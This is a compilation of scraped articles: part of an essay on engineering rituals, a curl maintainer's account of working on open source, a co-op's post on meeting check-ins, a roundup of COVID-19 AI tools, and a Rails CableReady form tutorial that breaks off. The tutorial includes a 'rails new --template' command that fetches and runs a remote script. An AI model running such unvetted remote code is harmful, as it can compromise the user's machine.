printed on a dot matrix printer that was out of ink; about one tenth of the text was unreadable. I spent countless hours playing games, learning BASIC and Z80 assembly, and deciphering the missing parts of the manual. I don't remember much else from that time. That little machine was a window into a different world— limitless, safe, and totally engaging. At the time, nothing else mattered.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg&quot;,&quot;height&quot;:1008,&quot;width&quot;:1456,&quot;resizeWidth&quot;:656,&quot;bytes&quot;:206242,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>My next computer was an IBM machine with an i386 processor, 2MB of RAM (the ZX Spectrum had 16KB), a 30MB hard disk, and a five inch floppy drive. I could load programs in seconds instead of minutes. I could run Dune 2 and Wolfenstein 3D and hex editors and Prince of Persia and MS DOS and Borland Turbo Pascal and Civilization and a C compiler and Windows 3.1. I could save stuff! I remember studying Win16 APIs and feeling like I made contact with an advanced alien civilization. As I type this now, I still have sense memory of that machine. The rubbery smell, the buzzing sound of the CRT monitor, the springy feel of the keyboard (with proper arrow keys and all sorts of extra buttons!)</p><p>Then my friend's parents bought him an i486 machine with 4MB of RAM. It could run Doom. Everything changed again. You didn't even need to play to know that computer history was just delineated into before and after. As soon as you saw the artwork of the game menu, you knew. Doom changed me in a profound way. I used to never think about computers or programming. It was just something I loved to do more than anything else. But a few seconds of Doom gameplay permanently flipped a bit in my brain. It made me aware that programming computers is what I want to be doing for the rest of my life.</p><p>After that came the internet, and with it a whirlwind of new worlds. Some were brand new. Others were old, but the internet gave me the opportunity to access them for the first time. Windows 95, newsgroups, geocities, ICQ, Visual Studio, Diablo, Starcraft, 3Dfx Voodoo Banshee, Gamedev.net, IRC, Slashdot, DirectX, Windows NT, Java, OpenGL, NewEgg, Winamp, Napster, Deus Ex, World of Warcraft, Linux, Emacs, GPL, Google, Common Lisp, Standard ML, Smalltalk, the iPhone, Oculus Rift. Each had its own unique atmosphere. Each was a window into a different universe. Each one felt limitless. Safe. Engaging.</p><p>Everything, from the first ZX Spectrum to Oculus Rift was punctuated by countless books of science fiction. My dad introduced me to the genre with Jules Verne's The Mysterious Island, in which a team of five end up on an uninhabited island, and use their knowledge and ingenuity to rebuild a technological civilization from scratch. I remember reading this novel over and over, completely enthralled. I tried some of the experiments, with intermittent success.</p><p>My parents had a few shelves stacked with books, and I spent countless nights losing myself in them. I read everything by Jules Verne I could get my hands on, including From the Earth to the Moon, Twenty Thousand Leagues Under the Sea, Around the World in Eighty Days, and Journey to the Center of the Earth. After Verne I moved on to Ray Bradbury (The Veldt), Arkadiy and Boris Strugatsky (Prisoners of Power), Stanislaw Lem (the fantastical Summa Technologiae). I also read every story we had by Jack London— I couldn't imagine anything more exciting than the combination of science fiction and the romance of the American frontier. Today, nearly thirty years later, I still can't.</p><p>After we moved to America I learned that there is an enormous universe of science fiction that I missed as a child. I started filling the gaps and read stories and novels by Isaac Asimov, Arthur Clarke, William Gibson, Neal Stephenson, Ian Banks, Philip Dick, Cory Doctorow, Charlie Stross, Dan Simmons, Jack Vance, and Vernor Vinge. I also continued reading Russian science fiction. I read everything by Strugatsky brothers, and binge-read the pulpy Russian spin on the cyberpunk genre by Sergei Lukyanenko.</p><p>As I grew older I shifted to reading about megaprojects and the intersection of technology and commerce. I read about railroads, electrification, aviation, radio, television, silicon, and the stories of Bell Labs, Microsoft, The Manhattan Project, and The Apollo program. How the heck did we invent all this stuff, wire the planet, speed up transportation by two orders of magnitude, go to space, put a computer on every desk, and then, as if it weren't enough, put a supercomputer in every pocket?! How did we do all <em>that</em>?!</p><p>Sometimes I imagine what would happen if I could send my ten year old self a letter and tell him I could press a button and read <a href="https://amzn.to/2TrADJK">Masters of Doom</a> the next day, instantly send a short message to John Carmack from <em>anywhere</em> using an always connected supercomputer in my pocket, or that I worked for a company that published <a href="https://amzn.to/2HsSXQm">The Making of Prince of Persia</a>. He would have been over the moon!</p><p>But sitting at a mandated retrospective or mindlessly gluing APIs together doesn't put me over the moon. It makes me feel the opposite (whatever the opposite of being over the moon is). And so, engineers are faced with two realities. One reality is the atmosphere of new technology, its incredible power to transform the human condition, the joy of the art of doing science and engineering, the trials of the creative process, the romance of the frontier. The other reality is the frustration and drudgery of operating in a world of corporate politics, bureaucracy, envy and greed— a world <em>so</em> depressing, that many people quit in frustration, never to come back.</p><p>If you work in technology, the monastery can be distant and vague, whereas Paul from marketing wants to circle back with you here and now. Then, as you circle back again and again, the monastery recedes further into the distance, and the drudgery appears closer and closer, until it occupies your entire field of vision and you can't see anything else.</p><p>I have friends in the medical field, and they vent about drudgery and endless bureaucracy <em>all the time</em>. They have more roadblocks than we do, and theirs are objectively worse than ours. The hours are longer, the bureaucracy is more entrenched, the regulators mandate their time be wasted on bullshit, and mistakes can have devastating consequences. Yet I haven't heard of a single doctor who quit his practice and moved to Colorado to run a ski lodge. When I ask why, they all give the same response: the patients. Every day they see patients brought back to health, the bullshit recedes into the background, and they're reminded why they got into medicine.</p><p>The default in engineering is different. We don't have a daily ritual built into our jobs that reminds us why we got into the field. Without a ritual, the drudgery creeps closer and the vision of the monastery recedes. So we must be very deliberate in developing rituals to keep the two realities in their proper proportion.</p><p>I think the reason many engineers have trouble with this is that so much of our field is about knowledge, but rituals aren't about knowledge at all— they're about practice. You must develop a daily mantra, a spell, a routine, whatever you want to call it, and then perform it religiously. I needed a lot of trial and error to get it right, and I’m still playing with the details. The internet desensitized me to text and video. Anything that happens in front of a screen doesn't help with perspective anymore. But I discovered that getting away from the screen and handling physical items does.</p><p>I don't know what will work for you, but here are a few ideas. Read used hard cover …</p></div></div>

<p>I work full time on open source and this is how.</p>



<h2>Background</h2>



<p>I started learning how to program in my teens, well over thirty years ago and I’ve worked as a software engineer and developer since the early 1990s. My first employment as a developer was in 1993. I’ve since worked for and with lots of companies and I’ve worked on a huge amount of (proprietary) software products and devices over many years. Meaning: I certainly didn’t start my life open source. I had to earn it.</p>



<p>When I was 20 years old I did my (then mandatory) military service in Sweden. After having endured that, I applied to the university while at the same time I was offered a job at IBM. I hesitated, but took the job. I figured I could always go to university later – but life took other turns and I never did. I didn’t do a single day of university. I haven’t regretted it.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/10/commodore64.jpg" alt="" width="229" height="119"></figure></div>



<p>I learned to code in the mid 80s on a Commodore 64 and software development has been one of my primary hobbies ever since. One thing it taught me well, that I still carry with me, is to spend a few hours per day in front of my home computer.</p>



<h2>And then I shipped curl</h2>



<p>In the spring of 1998 I renamed my little pet project of the time again and I released the first ever <a href="https://curl.haxx.se/">curl</a> release. I have told this story many times, but since then I have spent two hours or so of my spare time on that project – <em>every day for over twenty years</em>. While still working as a software engineer by day.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="214" height="187" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 214px) 100vw, 214px"></figure></div>



<p>Over time, curl gradually grew popular and attracted more users. There was no sudden moment in time where I struck gold and everything took off. It was just slowly gaining ground while me and my fellow project members kept improving and polishing curl. At some point in time I happened to notice that curl and libcurl would appear in more and more acknowledgements and in open source license collections in products and devices.</p>



<p>It was still just a spare time project.</p>



<h2>Proprietary Software for years</h2>



<p>I’d like to emphasize that I worked as a contract and consultant developer for many years (over 20!), primarily on proprietary software and custom solutions, before I managed to land myself a position where I could primarily write open source as part of my job.</p>



<h2>Mozilla</h2>



<p>In 2014 I <a href="https://daniel.haxx.se/blog/2014/01/13/this-is-my-first-day-at-mozilla/" data-type="post" data-id="5377">joined Mozilla</a> and got the opportunity to work on the open source project Firefox for a living – and doing it entirely from my home. This was the first time in my career I actually spent most of my days on code that was made public and available to the world. They even allowed me to spend a part of my work hours on curl, even if that didn’t really help them and curl was not a fundamental part of any Mozilla work or products. It was still great.</p>



<p>I landed that job for Mozilla a lot thanks to my many years and long experience with portable network coding and running a successful open source project at this level.</p>



<p>My work setup with Mozilla made it possible for me to spend even more time on curl, apart from the (still going) two daily spare time hours. Nobody at Mozilla cared much about (my work with) curl and no one there even asked me about it. I worked on Firefox for a living.</p>



<p>For anyone wanting to do open source as part of their work, getting a job at a company that already does a lot of open source is probably the best path forward. Even if that might not be easy either, and it might also mean that you would have to accept working on some open source projects that you might not yourself be completely sold on.</p>



<p>In late 2018 I quit Mozilla, in part because I wanted to try to work with curl “for real” (and part other reasons that I’ll leave out here). curl was then already over twenty years old and was used more than ever before.</p>



<h2>wolfSSL</h2>



<p>I now <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">work for wolfSSL</a>. We sell curl support and related services to companies. Companies pay <a href="https://wolfssl.com/">wolfSSL</a>, wolfSSL pays me a salary and I get food on the table. This works as long as we can convince enough companies that this is a good idea.</p>



<p>The vast majority of curl users out there of course don’t pay anything and will never pay anything. We just need a small number of companies to do it – and it seems to be working. We help customers use curl better, we make curl better for them and we make them ship better products this way. It’s a win win. And I can work on open source all day long thanks to this.</p>



<h2>My open source life-style</h2>



<p>A normal day in the work week, I get up before 7 in the morning and I have breakfast with my family members: my wife and my two kids. Then I grab my first cup of coffee for the day and take the thirteen steps up the stairs to my “office”.</p>



<p>I sit down in front of my main development (Linux) machine with two 27″ screens and get to work.</p>



<figure><img loading="lazy" width="1200" height="551" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-1200x551.jpg" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-1200x551.jpg 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-200x92.jpg 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-450x207.jpg 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-768x353.jpg 768w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers.jpg 2000w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>Photo of my work desk from a few years ago but it looks very similar still today.</figcaption></figure>



<h2>What work and in what order?</h2>



<p>I lead the curl project. It means many questions and decisions fall down to me to have an opinion about or say on, and it’s a priority for me to make sure that I unblock such situations as soon as possible so that developers wanting to do things with curl can continue doing that.</p>



<p>Thus, I read and respond to email about curl all hours I’m awake and have network access. Of course incoming messages actually rarely require immediate responses and then I can queue them up and instead do them later. I also try to read and assess all new incoming curl issues as soon as possible to see if there’s something urgent I should deal with immediately, or otherwise figure out how to deal with them going forward.</p>



<p>I usually have a set of bugs or features to work on so when there’s no alarming email or GitHub issue left, I context-switch over to the curl source code tree and the particular branch in which I work on right now. I typically have 20-30 different branches of development of various stages and maturity going on. If I get stuck on something, or if I create a pull-request for one of them that needs time to get all the CI jobs done, I switch over to one of the others.</p>



<p>Customers and their needs of course have priority when I decide what to work on. The exception would perhaps be security vulnerabilities or other really serious bugs being reported, but thankfully they are rare. But after that, I go by ear and work on what I think is fun and what I think users might appreciate.</p>



<p>If I want to go forward with something, for my own sake or for a customer’s, and that entails touching or improving other software in other projects, then I don’t shy away from submitting pull requests for them – or at least filing an issue.</p>



<h2>Spare time open source</h2>



<p>Yes, I still spend my spare time hours on open source, mostly curl. This means I often end up spending 50-55 hours per week on curl and curl related activities. But I don’t count or measure work hours and I rarely have to report any to anyone. This is a work of love.</p>



<p>Lots of people will say that they don’t have time because of life, family, kids etc. I have of course been very fortunate over the years to have had the opportunity and ability to spend all this time on what I want to do, but let’s not forget that people in general spend lots of time on their hobbies; on watching TV, on playing computer games and on socializing with friends and why not: to sleep. If you cut down on all of those things (yes, including the sleeping) there could very well be opportunities. It’s often a question of priorities. I’ve made spare time development a priority in my life.</p>



<h2>curl support?</h2>



<p>Any company that uses curl or libcurl – and they are plenty – could benefit from buying support from us instead of wasting their own time and resources. We at wolfSSL are probably much better at curl already and we can find and fix the issues much faster, which ends up cheaper and better long-term.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><p>Before every meeting we do, we like to check in. This means going from person to person (talking in <a href="https://patterns.sociocracy30.org/rounds.html">rounds</a>), saying out loud how we are feeling, if there is anything on our mind and how things are going. We have done this in more or less every meeting we have done since our founding in 2018.</p><p>For example, a standard check in might run something like:</p><ul><li>Person A: Feeling great, looking forward to the meeting</li><li>Person B: A bit anxious at the moment, worried about the contracts coming in</li><li>Person C: Feel pretty great, excited for the meeting</li><li>Person D: Feeling quite tired, been a long week, bit worried because my partner is sick.</li></ul><h2>Why we do this</h2><p>This ritual has two effects:</p><ol><li>It lets other people in the meeting know what is going on outside of the meeting.</li><li>It allows space for these things to be said, when they might have otherwise not been.</li></ol><p>Check ins allow us to adjust our behaviour according to what's been shared by others in the group, and act in solidarity towards them. For example, there might be something that we can do to alleviate someone's anxiety. The fact that one member is tired might mean you are especially tight on meeting timings so you can end the meeting early.</p><p>It also allows people to get something that is worrying off their chest. A problem shared is a problem halved. It tries to make sharing difficult things less awkward by always allowing dedicated time for them.</p><p>Someone saying they are worried about a difficult meeting immediately changes the dynamics of that meeting. If everyone admits it is likely going to be a difficult meeting, it makes it a lot easier to deal with.</p><p>Speaking aloud outside worries allows you perhaps address them and, at least temporarily, put them aside. This will also mean that the meeting itself remains focused, as you've addressed any things that might be distracting at the outset.</p><h2>How we do this</h2><p>As well as at the start of meetings, we do this at the start of every day, as part of our <a href="https://www.scrumguides.org/scrum-guide.html#events-daily">scrum style meeting</a>. We do two rounds:</p><ol><li>Check in.</li><li>Standard scrum style questions: what each person worked on yesterday, what they are working on today and if there are any blockers.</li></ol><p>Sometimes, if the check in warrants it and it feels right, we will actually discuss the content of the check in. For example, once a member was particularly worried about an aspect of a project, to the extent it had kept them up the night before. On hearing this, we worked as a team to collectively fix what they were worried about after the daily scrum, which resolved the issue and made them feel a lot better.</p><p>We've discovered that sometimes sharing the full extent of what you are feeling, in a group setting, feels quite hard. Or that following a series of positive check ins with something more negative is quite difficult. However, over time it becomes easier and less awkward to do so. Having learnt this, we try and make sure people can talk about how they are feeling in a more private setting through a buddying system.</p><h2>Checking in with others</h2><p>Sometimes, we try and do this in meetings with collaborators we are working with outside of the co-op. We explain the idea, talk it through and explain that if people don't feel comfortable then they can say "pass". Often we start, to give an example for others to follow.</p><p>This works incredibly well. During a particular campaign, we were working on a project with an extremely tight deadline. Having introduced the practice, we began with checking in ourselves. Our collaborator's check in was something like: "I'm incredibly anxious because I'm worried that I'm the only person responsible for such a high profile project, so I am basically quite afraid". We were able to reassure them that we were also responsible and wouldn't let it fail. The whole atmosphere of the room palpably shifted! In other situations, people have really taken to it.</p><h2>Checking in in sociocracy</h2><p><a href="https://patterns.sociocracy30.org/check-in.html">Checking in</a> is one part of the <a href="https://www.sociocracyforall.org/what-is-sociocracy/">sociocratic decision making process</a> we use in our meetings that tries to make meetings more human, egalitarian and effective.</p><h2>Why not give it a try?</h2><p>Checking in one of the easiest sociocratic techniques to start doing.</p><p>If you've read this and decided to try it out, <a href="mailto:hello@commonknowledge.coop">drop us a line to say how it is going</a>. Or share this blog post on social media or over email.</p><p><em>If you'd like training on these techniques, <a href="https://outlandish.com/workshop-sociocracy-and-better-decision-making/">our friends at Outlandish offer it and it is really worthwhile</a>.</em></p></main></div></div>]]>

<h3>Digital Twin</h3><p>The use of mechanical ventilation can save lives. But the lung is a complex organ, and the amount of pressure necessary to keep all parts of the lung open to airflow can actually cause damage to some parts through overdistention of the tissue. “The real crux of the problem is that when we’re treating a patient using mechanical ventilation, up until now, there hasn’t been any way to detect overdistention of the lung tissue," said Prof. Wolfgang Wall, Professor for Computational Mechanics at the Technical University of Munich (TUM).<strong><br></strong><br>Wall and his team have harnessed the computing power of AI to develop a "<a href="https://tectales.com/search/index.html?term=Digital+twin" rel="noopener noreferrer" target="_blank" title=""><strong>digital twin</strong></a>” model of the patient’s lungs. The digital tool can “map” a patient’s lungs – and which can even be used for early detection of <a href="https://tectales.com/search/index.html?term=COVID-19" rel="noopener noreferrer" target="_blank" title=""><strong>COVID-19</strong></a> infections. “More than 80 percent of COVID-19 deaths are the result of acute lung failure,” said Wall. “And with long-term mechanical ventilation, the survival rate for our most critically ill patients drops to only 50 percent,” he added. “The goal of our work is that in the future, at each ventilation site a digital lung model helps to optimize the ventilation to the patient’s needs so that we can significantly increase the chance of survival.”</p></div>

<h3>Cough recognition</h3><div><p>Researchers at The Korea Advanced Institute of Science and Technology have developed a <strong><a href="https://tectales.com/tag/deep-learning/" rel="noopener noreferrer" target="_blank" title=""><strong>deep learning</strong></a></strong>-based cough recognition model to classify a coughing sound in real time. The coughing event classification model is combined with a sound camera that visualizes their locations in public places. The research team said they achieved a best test accuracy of 87.4 %. Professor Yong-Hwa Park from the Department of Mechanical Engineering said that it will be useful medical equipment during epidemics in public places such as schools, offices, and restaurants, and to constantly monitor patients’ conditions in a hospital room.</p><p>To develop a cough recognition model, a supervised learning was conducted with a convolutional <a href="https://tectales.com/tag/neural-networks/" rel="noopener noreferrer" target="_blank" title=""><strong>neural network&nbsp;</strong></a>(CNN). The model performs binary classification with an input of a one-second sound profile feature, generating output to be either a cough event or something else.</p></div><hr><div><p>The German tech company audEERING is in the process of developing an <strong><a href="https://tectales.com/tag/health-apps/" rel="noopener noreferrer" target="_blank" title=""><strong>app&nbsp;</strong></a></strong>aimed at detecting <a href="https://tectales.com/tag/coronavirus/" rel="noopener noreferrer" target="_blank" title=""><strong>coronavirus&nbsp;</strong></a>using the sounds of coughing and sneezing as well as voice recognition. The firm is banking on audio artificial intelligence as a means of containment and improved analysis of the disease.</p><p>With the app, users are asked to record audio of themselves coughing, sneezing or speaking. The technology begins to learn from such vocal characteristics, and compares the data to recordings of COVID-19 patients. Age, gender and health condition can all be automatically detected by the recordings, the company claims.</p></div></div>

<h3>Imaging AI</h3><div><p><a href="https://tectales.com/tag/ct/" rel="noopener noreferrer" target="_blank" title=""><strong>CT scans</strong></a> offer a deep insight into COVID-19 diagnosis and progression as compared to the often-used reverse transcription-polymerase chain reaction. These RT-PCR tests have high false negative rates, delays in processing and other challenges. In addition, CT scans show COVID-19 in people without symptoms, in those who have early symptoms, during the height of the disease and after symptoms resolve. However, CT is not always recommended as a diagnostic tool because the disease often looks similar to influenza-associated pneumonias on the scans. Researchers at University of Central Florida have now demonstrated that an AI algorithm could be trained to classify COVID-19 pneumonia in CT scans with up to 90 percent accuracy, as well as correctly identify positive cases 84 percent of the time and negative cases 93 percent of the time. “We demonstrated that a deep learning-based AI approach can serve as a standardized and objective tool to assist healthcare systems as well as patients,” says Ulas Bagci, an assistant professor in UCF’s Department of Computer Science.</p><p>To perform the study, the researchers trained a computer algorithm to recognize COVID-19 in lung CT scans of 1,280 multinational patients from China, Japan and Italy. Then they tested the algorithm on CT scans of 1,337 patients with lung diseases ranging from COVID-19 to cancer and non-COVID pneumonia. “We showed that robust AI models can achieve up to 90 percent accuracy in independent test populations, maintain high specificity in non-COVID-19 related pneumonias, and demonstrate sufficient generalizability to unseen patient populations and centers,” Bagci says.</p></div></div>

<h3>FluSense</h3><p>FluSense, a compact device about the size of a large dictionary, uses AI to predict trends in infectious respiratory illnesses, such as influenza, by detecting cough sounds and counting people in public spaces. This new edge-computing platform, envisioned for use in hospitals, healthcare waiting rooms, and larger public spaces, may expand the arsenal of health surveillance tools used to forecast seasonal flu and other viral respiratory outbreaks, such as COVID-19. "I thought if we could capture coughing or sneezing sounds from public spaces where a lot of people naturally congregate, we could utilize this information as a new source of data for predicting epidemiologic trends,” said Tauhidur Rahman, computer scientist and mobile <strong><a href="https://tectales.com/tag/sensors/" rel="noopener noreferrer" target="_blank" title=""><strong>sensor&nbsp;</strong></a></strong>expert at University of Massachusetts Amherst.</p></div>

<h3>CAVIDOTS</h3><p>Engineering computer scientists at Northwestern University are aiming to speed up treatments and vaccines for COVID-19 — by making researchers’ jobs easier. They have developed a new tool called CAVIDOTS (Coronavirus Document Text Summarization) that searches through scientific literature, predicting the most useful results for each user. After pulling documents of interest, the tool then uses AI to generate a short, easy-to-skim summary of each paper. “Researchers can spend hours combing through documents and reading peer-reviewed papers,” said Ning Wang, a graduate student who developed the tool. “Our tool provides the most salient details for academic articles rather than simply retrieving them. We hope this will be a time saver for researchers, guiding them to key information.”</p><p>To use CAVIDOTS, users can visit a web-based application and enter search terms. They can first enter large categories and then more specific keywords. The tool then searches through 30,000 documents in the COVID-19 Open Research Dataset (CORD-19), a free database housing scholarly articles related to the novel coronavirus.</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                 <p>Forms are <i>the</i> standard CRUD pattern and can be handled by standard Rails remote forms perfectly. Still there might be times when you want to use your newly acquired StimulusReflex superpowers for a slicker user experience. My suggestion would be to stick to your last, but below are two patterns you can utilize to improve not only your user interactions, but also your application structure.</p>
<h2>1. Vanilla CableReady</h2>
<p>On the <a href="https://discord.gg/XveN625">StimulusReflex discord</a> we frequently get asked how to best handle form submissions in reflexes. My answer tends to be: “Don’t”. Instead I’m first going to show you a more robust technique that relies on standard Rails remote forms and the power of <a href="https://cableready.stimulusreflex.com/">CableReady</a>.</p>
<p>I’m borrowing a bit of the excellent <a href="http://expo.stimulusreflex.com/demos/calendar/2020-10-01">Calendar Demo</a> on StimulusReflex’s expo site for the purposes of this walkthrough. (If you want to follow along, this RailsByte will install StimulusReflex and TailwindCSS. You can also use the <a href="https://github.com/julianrubisch/stimulus_reflex_form_patterns">demo repo</a>, complete with version tags)</p>
<p>For starters, our tiny calendar app needs just one model, <code>CalendarEvent</code>, which we generate with a scaffold command:</p>
<div><pre><span></span>rails new calendula --template <span>"https://www.railsbytes.com/script/z0gsd8"</span> --skip-spring --skip-action-text --skip-active-storage --skip-action-mailer --skip-action-mailbox --skip-sprockets --skip-webpack-install
bin/rails g scaffold CalendarEvent occurs_at:datetime description:text color:string
</pre></div>
<p>In the <code>index</code> template, we only render two partials: One containing the form to add a new event, and the calendar grid itself. We inject <code>@dates</code>, which is just a collection of <code>Date</code> objects we want to display, and <code>@calendar_events</code>, all <code>CalendarEvent</code> s in this date range.</p>
<div><pre><span></span><span>&lt;!-- app/views/calendar_events/index.html.erb --&gt;</span>
<span>&lt;div id="calendar-form"&gt;</span>
<span>  </span><span>&lt;%=</span> <span>render</span> <span>"form"</span><span>,</span> <span>calendar_event</span><span>:</span> <span>@calendar_event</span> <span>%&gt;</span><span></span>
<span>&lt;/div&gt;</span>

<span>&lt;div class="w-screen p-8"&gt;</span>
<span>  &lt;div class="grid grid-cols-7 w-full" id="calendar-grid"&gt;</span>
<span>    </span><span>&lt;%=</span> <span>render</span> <span>partial</span><span>:</span> <span>"calendar_events/calendar_grid"</span><span>,</span>
               <span>locals</span><span>:</span> <span>{</span><span>dates</span><span>:</span> <span>@dates</span><span>,</span> <span>calendar_events</span><span>:</span> <span>@calendar_events</span><span>}</span> <span>%&gt;</span><span></span>
<span>  &lt;/div&gt; </span>
<span>&lt;/div&gt;</span>
</pre></div>
<p>The <code>_calendar_grid.html.erb</code> partial renders a collection of <code>_date.html.erb</code> partials:</p>
<div><pre><span></span><span>&lt;!-- app/views/calendar_events/_calendar_grid.html.erb --&gt;</span>
<span>&lt;%</span> <span>Date</span><span>::</span><span>DAYNAMES</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>name</span><span>|</span> <span>%&gt;</span><span></span>
<span>  &lt;div class="bg-gray-500 text-white p-3"&gt;</span><span>&lt;%=</span> <span>name</span> <span>%&gt;</span><span>&lt;/div&gt;</span>
<span>&lt;%</span> <span>end</span> <span>%&gt;</span><span></span>
<span>&lt;%=</span> <span>render</span> <span>partial</span><span>:</span> <span>"date"</span><span>,</span> <span>collection</span><span>:</span> <span>dates</span><span>,</span>
           <span>locals</span><span>:</span> <span>{</span> <span>calendar_events</span><span>:</span> <span>calendar_events</span> <span>}</span> <span>%&gt;</span><span></span>
</pre></div>
<div><pre><span></span><span>&lt;!-- app/views/calendar_events/_date.html.erb</span>
<span>&lt;div class="flex flex-col justify-between border h-32 p-3"&gt;</span>
<span>  &lt;span class="text-small font-bold"&gt;</span><span>&lt;%=</span> <span>date</span> <span>%&gt;</span><span>&lt;/span&gt;</span>

<span>  </span><span>&lt;%</span> <span>(</span><span>calendar_events</span><span>[</span><span>date</span><span>]</span> <span>||</span> <span>[]</span><span>)</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>calendar_event</span><span>|</span> <span>%&gt;</span><span></span>
<span>    &lt;span class="bg-</span><span>&lt;%=</span> <span>calendar_event</span><span>.</span><span>color</span> <span>%&gt;</span><span>-700 rounded text-white px-4 py-2"&gt;</span>
<span>      </span><span>&lt;%=</span> <span>calendar_event</span><span>.</span><span>description</span> <span>%&gt;</span><span></span>
<span>      &lt;/span&gt;</span>
<span>  </span><span>&lt;%</span> <span>end</span> <span>%&gt;</span><span></span>
<span>&lt;/div&gt;</span>
</pre></div>
<p>The <code>_form.html.erb</code> partial is just the standard one generated by the scaffold, nothing fancy here. In the <code>calendar_events_controller.rb</code>, however, we need to change a couple of things. (I’ll omit the part where all the instance variables are set up. You can find it in the <a href="https://github.com/julianrubisch/stimulus_reflex_form_patterns/blob/main/app/controllers/calendar_events_controller.rb">demo repo</a> if you’re interested)</p>
<p>First, we remove the standard redirect upon successful insert. Second, we need to include the <code>CableReady::Broadcaster</code> module to inject this functionality. Then, we re-fetch the <code>@calendar_events</code> containing the newly created event and <code>morph</code> over the <code>#calendar-grid</code> using a <code>CableReady</code> broadcast:</p>
<div><pre><span></span><span># app/controllers/calendar_events_controller.rb</span>
<span>class</span> <span>CalendarEventsController</span> <span>&lt;</span> <span>ApplicationController</span>
  <span>include</span> <span>CableReady</span><span>::</span><span>Broadcaster</span>

  <span># ...</span>

  <span>def</span> <span>create</span>
    <span>@calendar_event</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>new</span><span>(</span><span>calendar_event_params</span><span>)</span>

    <span>if</span> <span>@calendar_event</span><span>.</span><span>save</span>
      <span>@calendar_events</span> <span>=</span> <span>CalendarEvent</span><span>.</span><span>where</span><span>(</span><span>occurs_at</span><span>:</span> <span>@date_range</span><span>)</span>
                           <span>.</span><span>order</span><span>(</span><span>:occurs_at</span><span>)</span><span>.</span><span>group_by</span><span>(</span><span>&amp;</span><span>:occurs_at_date</span><span>)</span>
      <span>cable_ready</span><span>[</span><span>"CalendarEvents"</span><span>].</span><span>morph</span><span>({</span>
        <span>selector</span><span>:</span> <span>"#calendar-grid"</span><span>,</span>
        <span>html</span><span>:</span> <span>CalendarEventsController</span><span>.</span><span>render</span><span>(</span><span>partial</span><span>:</span> <span>'calendar_events/calendar_grid'</span><span>,</span>
                                              <span>locals</span><span>:</span> <span>{</span><span>dates</span><span>:</span> <span>@dates</span><span>,</span> <span>calendar_events</span><span>:</span> <span>@calendar_events</span><span>}),</span>
        <span>children_only</span><span>:</span> <span>true</span><span>})</span>
      <span>cable_ready</span><span>.</span><span>broadcast</span>
    <span>else</span>
      <span>render</span> <span>:index</span>
    <span>end</span>
  <span>end</span>

  <span># ...</span>

<span>end</span>
</pre></div>
<p>Of course we need to do the necessary <code>CableReady</code> setup, i.e. create a channel and configure the corresponding JavaScript channel.</p>
<div><pre><span></span>bin/rails g channel CalendarEvents 
</pre></div>
<div><pre><span></span><span># app/channels/calendar_events_channel.rb</span>
<span>class</span> <span>CalendarEventsChannel</span> <span>&lt;</span> <span>ApplicationCable</span><span>::</span><span>Channel</span>
  <span>def</span> <span>subscribed</span>
    <span>stream_from</span> <span>"CalendarEvents"</span>
  <span>end</span>
<span>end</span>
</pre></div>
<div><pre><span></span><span>// app/javascript/channels/calendar_events_channel.js</span>
<span>import</span> <span>CableReady</span> <span>from</span> <span>"cable_ready"</span><span>;</span>
<span>import</span> <span>consumer</span> <span>from</span> <span>"./consumer"</span><span>;</span>

<span>consumer</span><span>.</span><span>subscriptions</span><span>.</span><span>create</span><span>(</span><span>"CalendarEventsChannel"</span><span>,</span> <span>{</span>
  <span>received</span><span>(</span><span>data</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>data</span><span>.</span><span>cableReady</span><span>)</span> <span>CableReady</span><span>.</span><span>perform</span><span>(</span><span>data</span><span>.</span><span>operations</span><span>);</span>
  <span>}</span>
<span>});</span>
</pre></div>
<p>Looking at the result we can observe that the insert works as expected, only the form does not reset. That’s expected though, since we’re not dealing with a normal request/response cycle, so we have to do this ourselves:</p>
<p><img src="https://blog.minthesize.com/assets/images/posts/2020/2020-10-16-calendula-01.gif" alt="../assets/images/posts/2020/2020-10-16-calendula-01.gif"></p>
<p>Let’s add a second <code>CableReady</code> operation for replacing the <code>#calendar-form</code> partial:</p>
